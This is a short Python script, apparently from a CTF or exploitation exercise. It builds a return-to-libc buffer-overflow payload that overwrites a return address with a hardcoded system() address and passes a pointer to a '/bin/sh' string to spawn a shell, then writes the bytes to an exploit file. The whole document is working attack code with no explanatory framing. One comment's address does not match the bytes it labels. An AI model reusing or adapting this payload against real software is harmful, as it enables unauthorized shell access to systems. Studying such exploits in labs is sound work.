bin_sh_addr = b"\xf1\x57\x0b\x08" # 0x80b57f1
return_address = b"\x39\x17\x05\x08" #  libc_system() 0x8051730
fill = b"0"*7*4


payload = fill + return_address + b"A"*4 + bin_sh_addr
print (payload)
f = open("exploit_ret_2_libc.exp", "wb")
f.write(payload)
f.close()